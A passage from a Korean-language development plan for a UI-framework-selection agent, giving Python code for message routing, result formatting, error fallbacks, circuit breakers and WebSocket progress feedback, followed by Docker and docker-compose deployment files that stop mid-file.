                    raise ValueError(f"Missing required field: {field}")

        # 포맷 변환
        if requirements.get('format') == 'structured_recommendation':
            return self._format_recommendation_message(message)
        elif requirements.get('format') == 'framework_specification':
            return self._format_specification_message(message)

        return message.__dict__

    def _format_recommendation_message(
        self,
        message: UIAgentMessage
    ) -> Dict[str, Any]:
        """추천 메시지 포맷"""

        return {
            'header': {
                'message_id': message.message_id,
                'timestamp': message.timestamp.isoformat(),
                'source': message.source_agent,
                'type': 'framework_recommendation'
            },
            'recommendation': {
                'primary': {
                    'framework': message.payload['framework'],
                    'confidence': message.payload['confidence_score'],
                    'reasoning': message.payload['reasoning']
                },
                'alternatives': message.payload.get('alternatives', []),
                'constraints_satisfied': message.payload.get('constraints', [])
            },
            'metadata': {
                'analysis_duration': message.payload.get('analysis_time'),
                'factors_considered': message.payload.get('factors', [])
            }
        }

````

**메시지 라우팅 구현**:

```python
class UIAgentMessageRouter:
    """UI Agent 메시지 라우팅"""

    def __init__(self):
        self.routing_table = {
            'nl_input_agent': {
                'natural_language_input': self._handle_nl_input,
                'clarification_request': self._handle_clarification
            },
            'parser_agent': {
                'parsed_requirements': self._handle_parsed_requirements,
                'metadata_update': self._handle_metadata_update
            },
            'component_decision_agent': {
                'component_query': self._handle_component_query,
                'framework_validation': self._handle_framework_validation
            }
        }

    async def route_message(
        self,
        source_agent: str,
        message_type: str,
        payload: Dict[str, Any]
    ) -> Optional[Dict[str, Any]]:
        """메시지 라우팅 및 처리"""

        handler = self.routing_table.get(source_agent, {}).get(message_type)

        if handler:
            return await handler(payload)
        else:
            # 기본 핸들러
            return await self._default_handler(
                source_agent,
                message_type,
                payload
            )

    async def _handle_nl_input(
        self,
        payload: Dict[str, Any]
    ) -> Dict[str, Any]:
        """자연어 입력 처리"""

        # NL Input Agent로부터 받은 데이터 처리
        project_description = payload.get('description', '')
        intent = payload.get('intent', {})

        # UI 프레임워크 관련 키워드 추출
        ui_keywords = self._extract_ui_keywords(project_description)

        # 프레임워크 선택 프로세스 시작
        return {
            'action': 'start_framework_selection',
            'extracted_keywords': ui_keywords,
            'user_intent': intent
        }

    async def _handle_parsed_requirements(
        self,
        payload: Dict[str, Any]
    ) -> Dict[str, Any]:
        """파싱된 요구사항 처리"""

        requirements = payload.get('requirements', [])
        constraints = payload.get('constraints', {})

        # UI 관련 요구사항 필터링
        ui_requirements = [
            req for req in requirements
            if req.get('category') in ['ui', 'frontend', 'ux']
        ]

        # 프레임워크 평가 시작
        return {
            'action': 'evaluate_frameworks',
            'ui_requirements': ui_requirements,
            'constraints': constraints
        }
````

**프로토콜 어댑터**:

```python
class UIAgentProtocolAdapter:
    """다양한 통신 프로토콜 지원"""

    def __init__(self):
        self.adapters = {
            'rest': RESTAdapter(),
            'grpc': GRPCAdapter(),
            'websocket': WebSocketAdapter(),
            'message_queue': MessageQueueAdapter()
        }

    async def adapt_message(
        self,
        message: Any,
        source_protocol: str,
        target_protocol: str
    ) -> Any:
        """프로토콜 간 메시지 변환"""

        # 소스 프로토콜에서 공통 포맷으로
        common_format = await self.adapters[source_protocol].to_common(message)

        # 공통 포맷에서 대상 프로토콜로
        return await self.adapters[target_protocol].from_common(common_format)

class RESTAdapter:
    """REST API 어댑터"""

    async def to_common(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """REST 요청을 공통 포맷으로 변환"""

        return {
            'message_type': request.get('action', 'unknown'),
            'payload': request.get('data', {}),
            'metadata': {
                'http_method': request.get('method', 'POST'),
                'headers': request.get('headers', {}),
                'query_params': request.get('params', {})
            }
        }

    async def from_common(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """공통 포맷을 REST 응답으로 변환"""

        return {
            'status': 'success',
            'data': message.get('payload', {}),
            'metadata': {
                'timestamp': datetime.utcnow().isoformat(),
                'message_id': message.get('message_id')
            }
        }
```

**검증 기준**:

- [ ] 모든 에이전트와의 통신 프로토콜 정의
- [ ] 메시지 라우팅 시스템 구현
- [ ] 프로토콜 어댑터 구현
- [ ] 비동기 통신 지원

### SubTask 4.18.2: 결과 포맷 표준화

**담당자**: API 설계자  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/result_standardization.py
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, asdict
from enum import Enum
import json

class ResultStatus(Enum):
    SUCCESS = "success"
    PARTIAL = "partial"
    FAILURE = "failure"
    PENDING = "pending"

@dataclass
class StandardizedResult:
    """표준화된 결과 포맷"""
    status: ResultStatus
    result_type: str
    data: Dict[str, Any]
    metadata: Dict[str, Any]
    errors: List[Dict[str, Any]] = None
    warnings: List[Dict[str, Any]] = None

    def to_json(self) -> str:
        """JSON 직렬화"""
        return json.dumps(asdict(self), default=str)

class UIAgentResultStandardizer:
    """UI Agent 결과 표준화"""

    def __init__(self):
        self.result_schemas = self._initialize_schemas()

    def _initialize_schemas(self) -> Dict[str, Any]:
        """결과 스키마 초기화"""

        return {
            'framework_recommendation': {
                'required': ['framework', 'confidence', 'reasoning'],
                'optional': ['alternatives', 'benchmarks', 'migration_path'],
                'format': 'recommendation'
            },
            'framework_comparison': {
                'required': ['frameworks', 'criteria', 'scores'],
                'optional': ['visualizations', 'detailed_analysis'],
                'format': 'comparison'
            },
            'configuration': {
                'required': ['framework', 'config', 'dependencies'],
                'optional': ['plugins', 'optimizations'],
                'format': 'configuration'
            }
        }

    async def standardize_result(
        self,
        raw_result: Dict[str, Any],
        result_type: str
    ) -> StandardizedResult:
        """결과 표준화"""

        # 스키마 검증
        schema = self.result_schemas.get(result_type)
        if not schema:
            raise ValueError(f"Unknown result type: {result_type}")

        # 필수 필드 검증
        self._validate_required_fields(raw_result, schema['required'])

        # 포맷별 처리
        if schema['format'] == 'recommendation':
            standardized_data = self._format_recommendation(raw_result)
        elif schema['format'] == 'comparison':
            standardized_data = self._format_comparison(raw_result)
        elif schema['format'] == 'configuration':
            standardized_data = self._format_configuration(raw_result)
        else:
            standardized_data = raw_result

        # 메타데이터 생성
        metadata = self._generate_metadata(result_type, raw_result)

        return StandardizedResult(
            status=ResultStatus.SUCCESS,
            result_type=result_type,
            data=standardized_data,
            metadata=metadata,
            errors=None,
            warnings=self._extract_warnings(raw_result)
        )

    def _format_recommendation(
        self,
        raw_result: Dict[str, Any]
    ) -> Dict[str, Any]:
        """추천 결과 포맷"""

        return {
            'recommendation': {
                'primary': {
                    'framework': raw_result['framework'],
                    'confidence_score': raw_result['confidence'],
                    'reasoning': raw_result['reasoning'],
                    'pros': raw_result.get('pros', []),
                    'cons': raw_result.get('cons', [])
                },
                'alternatives': [
                    {
                        'framework': alt['framework'],
                        'score': alt['score'],
                        'comparison': alt.get('comparison', {})
                    }
                    for alt in raw_result.get('alternatives', [])
                ]
            },
            'analysis': {
                'factors_considered': raw_result.get('factors', []),
                'requirements_matched': raw_result.get('matched_requirements', []),
                'constraints_satisfied': raw_result.get('satisfied_constraints', [])
            },
            'implementation': {
                'setup_guide': raw_result.get('setup_guide', ''),
                'boilerplate_url': raw_result.get('boilerplate_url', ''),
                'estimated_setup_time': raw_result.get('setup_time', 'unknown')
            }
        }

    def _format_comparison(
        self,
        raw_result: Dict[str, Any]
    ) -> Dict[str, Any]:
        """비교 결과 포맷"""

        return {
            'comparison_matrix': {
                'frameworks': raw_result['frameworks'],
                'criteria': raw_result['criteria'],
                'scores': raw_result['scores'],
                'normalized_scores': self._normalize_scores(raw_result['scores'])
            },
            'analysis': {
                'winner': self._determine_winner(raw_result['scores']),
                'strengths_weaknesses': self._analyze_strengths_weaknesses(
                    raw_result['frameworks'],
                    raw_result['scores']
                ),
                'use_case_recommendations': raw_result.get('use_cases', {})
            },
            'visualizations': {
                'radar_chart': self._generate_radar_data(raw_result),
                'bar_chart': self._generate_bar_data(raw_result),
                'comparison_table': self._generate_table_data(raw_result)
            }
        }
```

**결과 변환기**:

```python
class ResultTransformer:
    """다양한 포맷으로 결과 변환"""

    def __init__(self):
        self.transformers = {
            'json': self._to_json,
            'xml': self._to_xml,
            'yaml': self._to_yaml,
            'protobuf': self._to_protobuf,
            'graphql': self._to_graphql
        }

    async def transform(
        self,
        standardized_result: StandardizedResult,
        target_format: str,
        options: Dict[str, Any] = None
    ) -> Any:
        """결과 변환"""

        transformer = self.transformers.get(target_format)
        if not transformer:
            raise ValueError(f"Unsupported format: {target_format}")

        return await transformer(standardized_result, options or {})

    async def _to_json(
        self,
        result: StandardizedResult,
        options: Dict[str, Any]
    ) -> str:
        """JSON 변환"""

        data = asdict(result)

        # 옵션 처리
        if options.get('pretty'):
            return json.dumps(data, indent=2, default=str)

        if options.get('minimal'):
            # 최소 데이터만 포함
            minimal_data = {
                'status': data['status'],
                'data': data['data']['recommendation']['primary']
            }
            return json.dumps(minimal_data, default=str)

        return json.dumps(data, default=str)

    async def _to_graphql(
        self,
        result: StandardizedResult,
        options: Dict[str, Any]
    ) -> Dict[str, Any]:
        """GraphQL 응답 포맷"""

        return {
            'data': {
                'uiFrameworkRecommendation': {
                    'framework': result.data['recommendation']['primary']['framework'],
                    'confidence': result.data['recommendation']['primary']['confidence_score'],
                    'reasoning': result.data['recommendation']['primary']['reasoning'],
                    'alternatives': [
                        {
                            'framework': alt['framework'],
                            'score': alt['score']
                        }
                        for alt in result.data['recommendation']['alternatives']
                    ]
                }
            },
            'extensions': {
                'metadata': result.metadata
            }
        }
```

**결과 검증 및 필터링**:

```python
class ResultValidator:
    """결과 검증 및 필터링"""

    def __init__(self):
        self.validation_rules = self._initialize_rules()

    def _initialize_rules(self) -> Dict[str, Any]:
        """검증 규칙 초기화"""

        return {
            'confidence_threshold': 0.5,
            'min_alternatives': 2,
            'required_metadata': ['timestamp', 'version', 'analysis_id'],
            'sensitive_fields': ['internal_score', 'debug_info']
        }

    async def validate_and_filter(
        self,
        result: StandardizedResult,
        context: Dict[str, Any]
    ) -> StandardizedResult:
        """결과 검증 및 필터링"""

        # 신뢰도 검증
        if result.data.get('recommendation', {}).get('primary', {}).get('confidence_score', 0) < self.validation_rules['confidence_threshold']:
            result.warnings = result.warnings or []
            result.warnings.append({
                'code': 'LOW_CONFIDENCE',
                'message': 'Confidence score below threshold',
                'severity': 'medium'
            })

        # 민감한 정보 필터링
        filtered_data = self._filter_sensitive_data(
            result.data,
            context.get('user_role', 'public')
        )

        # 필수 메타데이터 검증
        for field in self.validation_rules['required_metadata']:
            if field not in result.metadata:
                result.metadata[field] = self._generate_default_metadata(field)

        result.data = filtered_data
        return result

    def _filter_sensitive_data(
        self,
        data: Dict[str, Any],
        user_role: str
    ) -> Dict[str, Any]:
        """민감한 데이터 필터링"""

        if user_role == 'public':
            # 공개 사용자에게는 민감한 필드 제거
            filtered = {}
            for key, value in data.items():
                if key not in self.validation_rules['sensitive_fields']:
                    if isinstance(value, dict):
                        filtered[key] = self._filter_sensitive_data(value, user_role)
                    else:
                        filtered[key] = value
            return filtered

        return data
```

**검증 기준**:

- [ ] 표준 결과 포맷 정의
- [ ] 다양한 출력 포맷 지원
- [ ] 결과 검증 메커니즘
- [ ] 민감 정보 필터링

### SubTask 4.18.3: 에러 처리 및 폴백 메커니즘

**담당자**: 신뢰성 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/error_handling.py
from typing import Dict, List, Optional, Any, Callable
from enum import Enum
import asyncio
import traceback
from datetime import datetime, timedelta

class ErrorSeverity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class ErrorCategory(Enum):
    COMMUNICATION = "communication"
    VALIDATION = "validation"
    PROCESSING = "processing"
    TIMEOUT = "timeout"
    RESOURCE = "resource"
    EXTERNAL = "external"

@dataclass
class UIAgentError:
    """UI Agent 에러 정의"""
    error_id: str
    category: ErrorCategory
    severity: ErrorSeverity
    message: str
    details: Dict[str, Any]
    timestamp: datetime
    retry_count: int = 0
    recoverable: bool = True

class UIAgentErrorHandler:
    """UI Agent 에러 처리"""

    def __init__(self):
        self.error_handlers = self._initialize_handlers()
        self.fallback_strategies = self._initialize_fallbacks()
        self.error_history = []
        self.circuit_breakers = {}

    def _initialize_handlers(self) -> Dict[ErrorCategory, Callable]:
        """에러 핸들러 초기화"""

        return {
            ErrorCategory.COMMUNICATION: self._handle_communication_error,
            ErrorCategory.VALIDATION: self._handle_validation_error,
            ErrorCategory.PROCESSING: self._handle_processing_error,
            ErrorCategory.TIMEOUT: self._handle_timeout_error,
            ErrorCategory.RESOURCE: self._handle_resource_error,
            ErrorCategory.EXTERNAL: self._handle_external_error
        }

    async def handle_error(
        self,
        error: Exception,
        context: Dict[str, Any]
    ) -> Dict[str, Any]:
        """에러 처리 메인 함수"""

        # 에러 분류
        ui_error = self._classify_error(error, context)

        # 에러 기록
        self.error_history.append(ui_error)

        # 서킷 브레이커 체크
        if self._check_circuit_breaker(ui_error):
            return await self._handle_circuit_open(ui_error, context)

        # 에러 핸들러 실행
        handler = self.error_handlers.get(ui_error.category)
        if handler:
            result = await handler(ui_error, context)

            # 복구 가능한 경우 재시도
            if ui_error.recoverable and ui_error.retry_count < 3:
                return await self._retry_operation(ui_error, context)

            return result

        # 기본 에러 처리
        return await self._default_error_handler(ui_error, context)

    def _classify_error(
        self,
        error: Exception,
        context: Dict[str, Any]
    ) -> UIAgentError:
        """에러 분류"""

        import uuid

        error_mapping = {
            ConnectionError: ErrorCategory.COMMUNICATION,
            TimeoutError: ErrorCategory.TIMEOUT,
            ValueError: ErrorCategory.VALIDATION,
            MemoryError: ErrorCategory.RESOURCE,
            KeyError: ErrorCategory.PROCESSING
        }

        category = ErrorCategory.PROCESSING
        for error_type, error_category in error_mapping.items():
            if isinstance(error, error_type):
                category = error_category
                break

        # 심각도 결정
        severity = self._determine_severity(error, category)

        return UIAgentError(
            error_id=str(uuid.uuid4()),
            category=category,
            severity=severity,
            message=str(error),
            details={
                'type': type(error).__name__,
                'traceback': traceback.format_exc(),
                'context': context
            },
            timestamp=datetime.utcnow(),
            recoverable=self._is_recoverable(error, category)
        )

    async def _handle_communication_error(
        self,
        error: UIAgentError,
        context: Dict[str, Any]
    ) -> Dict[str, Any]:
        """통신 에러 처리"""

        target_agent = context.get('target_agent')

        # 대체 통신 채널 시도
        alternative_channels = self._get_alternative_channels(target_agent)

        for channel in alternative_channels:
            try:
                return await self._try_alternative_channel(
                    channel,
                    context
                )
            except Exception:
                continue

        # 모든 채널 실패 시 폴백
        return await self._communication_fallback(error, context)

    async def _communication_fallback(
        self,
        error: UIAgentError,
        context: Dict[str, Any]
    ) -> Dict[str, Any]:
        """통신 폴백 전략"""

        fallback_response = {
            'status': 'fallback',
            'error': error.error_id,
            'message': 'Communication failed, using cached response',
            'data': None
        }

        # 캐시된 응답 확인
        cached = await self._get_cached_response(context)
        if cached:
            fallback_response['data'] = cached
            fallback_response['message'] = 'Using cached response'
        else:
            # 기본값 제공
            fallback_response['data'] = self._get_default_recommendation()
            fallback_response['message'] = 'Using default recommendation'

        return fallback_response
```

**폴백 전략 구현**:

```python
class FallbackStrategyManager:
    """폴백 전략 관리"""

    def __init__(self):
        self.strategies = {
            'default_recommendation': self._default_recommendation_strategy,
            'cached_response': self._cached_response_strategy,
            'simplified_analysis': self._simplified_analysis_strategy,
            'external_service': self._external_service_strategy,
            'manual_override': self._manual_override_strategy
        }

    async def execute_fallback(
        self,
        strategy_name: str,
        context: Dict[str, Any],
        error: UIAgentError
    ) -> Dict[str, Any]:
        """폴백 전략 실행"""

        strategy = self.strategies.get(strategy_name)
        if not strategy:
            strategy = self._default_recommendation_strategy

        try:
            return await strategy(context, error)
        except Exception as e:
            # 폴백도 실패한 경우 최후의 수단
            return self._ultimate_fallback(context, error, e)

    async def _default_recommendation_strategy(
        self,
        context: Dict[str, Any],
        error: UIAgentError
    ) -> Dict[str, Any]:
        """기본 추천 전략"""

        project_type = context.get('project_type', 'web')

        default_recommendations = {
            'web': {
                'framework': 'react',
                'confidence': 0.6,
                'reasoning': 'React is a safe default choice for web applications'
            },
            'mobile': {
                'framework': 'react-native',
                'confidence': 0.6,
                'reasoning': 'React Native provides good cross-platform support'
            },
            'desktop': {
                'framework': 'electron',
                'confidence': 0.5,
                'reasoning': 'Electron is widely used for desktop applications'
            }
        }

        recommendation = default_recommendations.get(
            project_type,
            default_recommendations['web']
        )

        return {
            'status': 'fallback',
            'data': {
                'recommendation': {
                    'primary': recommendation,
                    'alternatives': [],
                    'fallback_reason': f'Error occurred: {error.message}'
                }
            }
        }

    async def _simplified_analysis_strategy(
        self,
        context: Dict[str, Any],
        error: UIAgentError
    ) -> Dict[str, Any]:
        """간소화된 분석 전략"""

        # 최소한의 정보로 빠른 분석
        requirements = context.get('requirements', [])

        # 간단한 규칙 기반 매칭
        if any('real-time' in req.lower() for req in requirements):
            framework = 'react'
            reasoning = 'React excels at real-time updates'
        elif any('seo' in req.lower() for req in requirements):
            framework = 'next.js'
            reasoning = 'Next.js provides excellent SEO support'
        elif any('simple' in req.lower() for req in requirements):
            framework = 'vue'
            reasoning = 'Vue has a gentle learning curve'
        else:
            framework = 'react'
            reasoning = 'React is a versatile choice'

        return {
            'status': 'simplified',
            'data': {
                'recommendation': {
                    'primary': {
                        'framework': framework,
                        'confidence': 0.5,
                        'reasoning': reasoning
                    },
                    'analysis_method': 'simplified_rules'
                }
            }
        }
```

**서킷 브레이커 구현**:

```python
class CircuitBreaker:
    """서킷 브레이커 패턴"""

    def __init__(
        self,
        failure_threshold: int = 5,
        recovery_timeout: int = 60,
        expected_exception: type = Exception
    ):
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self.expected_exception = expected_exception
        self.failure_count = 0
        self.last_failure_time = None
        self.state = 'closed'  # closed, open, half-open

    async def call(
        self,
        func: Callable,
        *args,
        **kwargs
    ) -> Any:
        """서킷 브레이커를 통한 함수 호출"""

        if self.state == 'open':
            if self._should_attempt_reset():
                self.state = 'half-open'
            else:
                raise Exception("Circuit breaker is OPEN")

        try:
            result = await func(*args, **kwargs)
            self._on_success()
            return result
        except self.expected_exception as e:
            self._on_failure()
            raise e

    def _should_attempt_reset(self) -> bool:
        """리셋 시도 여부"""

        return (
            self.last_failure_time and
            datetime.utcnow() - self.last_failure_time > timedelta(seconds=self.recovery_timeout)
        )

    def _on_success(self):
        """성공 시 처리"""

        self.failure_count = 0
        self.state = 'closed'

    def _on_failure(self):
        """실패 시 처리"""

        self.failure_count += 1
        self.last_failure_time = datetime.utcnow()

        if self.failure_count >= self.failure_threshold:
            self.state = 'open'

class UIAgentCircuitManager:
    """UI Agent 서킷 브레이커 관리"""

    def __init__(self):
        self.breakers = {
            'nl_input_agent': CircuitBreaker(failure_threshold=3),
            'parser_agent': CircuitBreaker(failure_threshold=5),
            'component_decision_agent': CircuitBreaker(failure_threshold=4),
            'external_api': CircuitBreaker(failure_threshold=2, recovery_timeout=120)
        }

    async def protected_call(
        self,
        service_name: str,
        func: Callable,
        *args,
        **kwargs
    ) -> Any:
        """보호된 서비스 호출"""

        breaker = self.breakers.get(service_name)
        if not breaker:
            # 서킷 브레이커가 없으면 직접 호출
            return await func(*args, **kwargs)

        try:
            return await breaker.call(func, *args, **kwargs)
        except Exception as e:
            # 서킷이 열린 경우 폴백
            return await self._handle_open_circuit(service_name, e)
```

**검증 기준**:

- [ ] 포괄적인 에러 분류 체계
- [ ] 다단계 폴백 전략
- [ ] 서킷 브레이커 구현
- [ ] 자동 복구 메커니즘

### SubTask 4.18.4: 실시간 피드백 시스템

**담당자**: 실시간 시스템 개발자  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/realtime_feedback.py
from typing import Dict, List, Optional, Any, Callable
import asyncio
from datetime import datetime
import json

class FeedbackType(Enum):
    PROGRESS = "progress"
    PARTIAL_RESULT = "partial_result"
    STATUS_UPDATE = "status_update"
    WARNING = "warning"
    METRIC = "metric"

@dataclass
class RealtimeFeedback:
    """실시간 피드백 데이터"""
    feedback_type: FeedbackType
    data: Dict[str, Any]
    timestamp: datetime
    sequence_number: int
    correlation_id: str

class UIAgentRealtimeFeedback:
    """UI Agent 실시간 피드백 시스템"""

    def __init__(self):
        self.feedback_channels = {}
        self.subscribers = {}
        self.sequence_counters = {}
        self.feedback_buffer = {}

    async def initialize_feedback_channel(
        self,
        correlation_id: str,
        channel_type: str = 'websocket'
    ) -> str:
        """피드백 채널 초기화"""

        channel_id = f"{correlation_id}:{channel_type}"

        self.feedback_channels[channel_id] = {
            'type': channel_type,
            'created_at': datetime.utcnow(),
            'subscribers': set(),
            'active': True
        }

        self.sequence_counters[channel_id] = 0
        self.feedback_buffer[channel_id] = []

        # 채널별 처리기 시작
        asyncio.create_task(
            self._process_feedback_channel(channel_id)
        )

        return channel_id

    async def send_feedback(
        self,
        correlation_id: str,
        feedback_type: FeedbackType,
        data: Dict[str, Any]
    ):
        """피드백 전송"""

        # 활성 채널 찾기
        active_channels = [
            ch_id for ch_id, ch_info in self.feedback_channels.items()
            if ch_id.startswith(correlation_id) and ch_info['active']
        ]

        for channel_id in active_channels:
            # 시퀀스 번호 증가
            self.sequence_counters[channel_id] += 1

            feedback = RealtimeFeedback(
                feedback_type=feedback_type,
                data=data,
                timestamp=datetime.utcnow(),
                sequence_number=self.sequence_counters[channel_id],
                correlation_id=correlation_id
            )

            # 버퍼에 추가
            self.feedback_buffer[channel_id].append(feedback)

    async def _process_feedback_channel(self, channel_id: str):
        """피드백 채널 처리"""

        channel_info = self.feedback_channels[channel_id]

        while channel_info['active']:
            try:
                # 버퍼에서 피드백 가져오기
                if self.feedback_buffer[channel_id]:
                    feedback = self.feedback_buffer[channel_id].pop(0)

                    # 구독자들에게 전송
                    await self._broadcast_to_subscribers(
                        channel_id,
                        feedback
                    )
                else:
                    # 버퍼가 비어있으면 잠시 대기
                    await asyncio.sleep(0.1)

            except Exception as e:
                print(f"Error processing feedback channel {channel_id}: {e}")

    async def _broadcast_to_subscribers(
        self,
        channel_id: str,
        feedback: RealtimeFeedback
    ):
        """구독자들에게 피드백 브로드캐스트"""

        subscribers = self.subscribers.get(channel_id, set())

        for subscriber in subscribers:
            try:
                await subscriber(feedback)
            except Exception as e:
                print(f"Error sending feedback to subscriber: {e}")
```

**진행 상황 추적기**:

```python
class ProgressTracker:
    """프레임워크 선택 진행 상황 추적"""

    def __init__(self, feedback_system: UIAgentRealtimeFeedback):
        self.feedback_system = feedback_system
        self.progress_stages = [
            'initialization',
            'requirement_analysis',
            'framework_evaluation',
            'benchmark_execution',
            'score_calculation',
            'recommendation_generation',
            'finalization'
        ]
        self.current_stage = 0
        self.stage_progress = {}

    async def start_tracking(self, correlation_id: str):
        """진행 상황 추적 시작"""

        self.correlation_id = correlation_id
        self.start_time = datetime.utcnow()

        await self.feedback_system.send_feedback(
            correlation_id,
            FeedbackType.STATUS_UPDATE,
            {
                'status': 'started',
                'total_stages': len(self.progress_stages),
                'estimated_duration': '10-30 seconds'
            }
        )

    async def update_stage(
        self,
        stage_name: str,
        progress: float,
        details: Optional[Dict[str, Any]] = None
    ):
        """단계 진행 상황 업데이트"""

        stage_index = self.progress_stages.index(stage_name)
        self.current_stage = stage_index
        self.stage_progress[stage_name] = progress

        # 전체 진행률 계산
        overall_progress = self._calculate_overall_progress()

        # 피드백 전송
        await self.feedback_system.send_feedback(
            self.correlation_id,
            FeedbackType.PROGRESS,
            {
                'current_stage': stage_name,
                'stage_progress': progress,
                'overall_progress': overall_progress,
                'details': details or {},
                'elapsed_time': (datetime.utcnow() - self.start_time).total_seconds()
            }
        )

    def _calculate_overall_progress(self) -> float:
        """전체 진행률 계산"""

        completed_stages = self.current_stage
        current_stage_progress = self.stage_progress.get(
            self.progress_stages[self.current_stage],
            0
        )

        overall = (completed_stages + current_stage_progress) / len(self.progress_stages)
        return min(overall, 1.0)

    async def send_partial_result(
        self,
        result_type: str,
        data: Dict[str, Any]
    ):
        """부분 결과 전송"""

        await self.feedback_system.send_feedback(
            self.correlation_id,
            FeedbackType.PARTIAL_RESULT,
            {
                'result_type': result_type,
                'data': data,
                'is_final': False
            }
        )
```

**실시간 메트릭 수집**:

```python
class RealtimeMetricsCollector:
    """실시간 성능 메트릭 수집"""

    def __init__(self, feedback_system: UIAgentRealtimeFeedback):
        self.feedback_system = feedback_system
        self.metrics = {}
        self.collection_interval = 1.0  # 1초

    async def start_collection(self, correlation_id: str):
        """메트릭 수집 시작"""

        self.correlation_id = correlation_id
        self.collection_task = asyncio.create_task(
            self._collect_metrics_loop()
        )

    async def _collect_metrics_loop(self):
        """메트릭 수집 루프"""

        while True:
            try:
                metrics = await self._collect_current_metrics()

                await self.feedback_system.send_feedback(
                    self.correlation_id,
                    FeedbackType.METRIC,
                    metrics
                )

                await asyncio.sleep(self.collection_interval)

            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"Error collecting metrics: {e}")

    async def _collect_current_metrics(self) -> Dict[str, Any]:
        """현재 메트릭 수집"""

        import psutil
        import resource

        # 시스템 메트릭
        process = psutil.Process()

        return {
            'timestamp': datetime.utcnow().isoformat(),
            'cpu_usage': process.cpu_percent(),
            'memory_usage': process.memory_info().rss / 1024 / 1024,  # MB
            'active_frameworks_evaluated': len(self.metrics.get('frameworks', [])),
            'api_calls_made': self.metrics.get('api_calls', 0),
            'cache_hits': self.metrics.get('cache_hits', 0),
            'cache_misses': self.metrics.get('cache_misses', 0),
            'average_response_time': self.metrics.get('avg_response_time', 0)
        }
```

**WebSocket 피드백 핸들러**:

```python
class WebSocketFeedbackHandler:
    """WebSocket 기반 실시간 피드백"""

    def __init__(self):
        self.connections = {}

    async def handle_connection(self, websocket, path):
        """WebSocket 연결 처리"""

        connection_id = str(uuid.uuid4())
        correlation_id = await self._authenticate_connection(websocket)

        if not correlation_id:
            await websocket.close()
            return

        self.connections[connection_id] = {
            'websocket': websocket,
            'correlation_id': correlation_id,
            'subscribed_types': set()
        }

        try:
            await self._handle_messages(connection_id)
        finally:
            del self.connections[connection_id]

    async def _handle_messages(self, connection_id: str):
        """메시지 처리"""

        connection = self.connections[connection_id]
        websocket = connection['websocket']

        async for message in websocket:
            try:
                data = json.loads(message)

                if data['type'] == 'subscribe':
                    feedback_types = data.get('feedback_types', ['all'])
                    connection['subscribed_types'].update(feedback_types)

                elif data['type'] == 'unsubscribe':
                    feedback_types = data.get('feedback_types', [])
                    connection['subscribed_types'].difference_update(feedback_types)

            except Exception as e:
                await websocket.send(json.dumps({
                    'type': 'error',
                    'message': str(e)
                }))

    async def send_feedback_to_connection(
        self,
        connection_id: str,
        feedback: RealtimeFeedback
    ):
        """특정 연결로 피드백 전송"""

        connection = self.connections.get(connection_id)
        if not connection:
            return

        # 구독 타입 확인
        if ('all' in connection['subscribed_types'] or
            feedback.feedback_type.value in connection['subscribed_types']):

            websocket = connection['websocket']

            await websocket.send(json.dumps({
                'type': 'feedback',
                'feedback_type': feedback.feedback_type.value,
                'data': feedback.data,
                'timestamp': feedback.timestamp.isoformat(),
                'sequence': feedback.sequence_number
            }))
```

**검증 기준**:

- [ ] 실시간 진행 상황 추적
- [ ] 부분 결과 스트리밍
- [ ] WebSocket 통신 구현
- [ ] 성능 메트릭 실시간 수집

## Task 4.19: UI Agent 배포 준비

### SubTask 4.19.1: UI Agent 컨테이너화

**담당자**: DevOps 엔지니어  
**예상 소요시간**: 8시간

**작업 내용**:

```dockerfile
# backend/src/agents/implementations/ui_selection/Dockerfile
FROM python:3.11-slim AS builder

# 빌드 의존성 설치
RUN apt-get update && apt-get install -y \
    build-essential \
    curl \
    && rm -rf /var/lib/apt/lists/*

# 작업 디렉토리 설정
WORKDIR /app

# 의존성 파일 복사 및 설치
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Agno 프레임워크 설치
RUN pip install agno

# 소스 코드 복사
COPY . .

# 런타임 이미지
FROM python:3.11-slim

# 런타임 의존성 설치
RUN apt-get update && apt-get install -y \
    libpq5 \
    && rm -rf /var/lib/apt/lists/*

# 비권한 사용자 생성
RUN useradd -m -u 1000 agent && \
    mkdir -p /app/data /app/logs && \
    chown -R agent:agent /app

WORKDIR /app

# 빌더에서 설치된 패키지 복사
COPY --from=builder /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages
COPY --from=builder /usr/local/bin /usr/local/bin

# 애플리케이션 복사
COPY --chown=agent:agent . .

# 환경 변수 설정
ENV PYTHONUNBUFFERED=1 \
    AGENT_TYPE=ui_selection \
    LOG_LEVEL=INFO

# 헬스체크
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD python -c "import requests; requests.get('http://localhost:8080/health')"

# 비권한 사용자로 전환
USER agent

# 포트 노출
EXPOSE 8080

# 엔트리포인트
ENTRYPOINT ["python", "-m", "agents.implementations.ui_selection.main"]
```

**Docker Compose 설정**:

```yaml
# docker-compose.yml
version: "3.8"

services:
  ui-selection-agent:
    build:
      context: ./backend/src/agents/implementations/ui_selection
      dockerfile: Dockerfile
    image: t-developer/ui-selection-agent:latest
    container_name: ui-selection-agent
    restart: unless-stopped
    ports:
      - "8080:8080"
    environment:
      - AGENT_ID=ui-selection-agent-001
      - REDIS_URL=redis://redis:6379
      - DATABASE_URL=postgresql://user:pass@postgres:5432/t_developer
      - LOG_LEVEL=INFO
      - ENABLE_METRICS=true
      - CACHE_TTL=3600
    volumes:
      - ./logs:/app/logs
      - ./data:/app/data
    networks:
      - t-developer-network
    depends_on:
      - redis
      - postgres
    deploy:
      resources:
        limits:
          cpus: "2"
          memory: 2G
        reservations:
          cpus: "1"
          memory: 1G

  redis:
    image: redis:7-alpine
    container_name: t-developer-redis
    restart: unless-stopped
    ports:
      - "6379:6379"
    volumes:
      - redis-data:/data
    networks:
      - t-developer-network

  postgres:
